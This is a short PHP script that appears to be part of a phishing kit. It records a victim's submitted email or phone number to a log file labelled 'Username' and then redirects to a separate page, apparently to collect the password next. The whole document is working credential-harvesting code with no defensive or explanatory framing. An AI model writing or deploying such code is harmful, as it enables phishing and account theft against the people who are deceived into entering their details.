<?php

    file_put_contents("log.txt", "Username: " . $_POST['Email_or_Phone'] . "\n", FILE_APPEND);
header('Location: pass.login.php');
exit();
